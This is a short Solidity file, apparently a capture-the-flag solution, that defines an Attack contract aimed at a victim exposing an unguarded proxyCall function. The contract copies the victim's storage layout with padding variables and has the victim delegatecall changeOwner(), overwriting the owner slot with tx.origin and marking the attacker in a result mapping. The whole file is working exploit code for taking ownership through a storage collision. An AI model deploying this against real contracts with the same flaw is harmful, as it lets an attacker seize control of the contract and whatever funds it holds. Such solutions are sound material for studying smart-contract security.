// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ID31eg4t3 {
    function proxyCall(bytes calldata data) external returns (address);
    function changeResult() external;
}

contract Attack {
    address internal immutable victim;
    uint256 var1 = 23456;
    uint256 var2 = 34567;
    uint256 var3 = 45678;
    uint256 var4 = 45678;
    address public owner;
    mapping(address => bool) public result;
        
    constructor(address addr) payable {
        victim = addr;
    }

    function changeOwner() public {
        owner = tx.origin;
        result[owner] = true;
    }

    function exploit() external {
        bytes memory data = abi.encodeWithSignature("changeOwner()");
        ID31eg4t3(victim).proxyCall(data);
    }
}
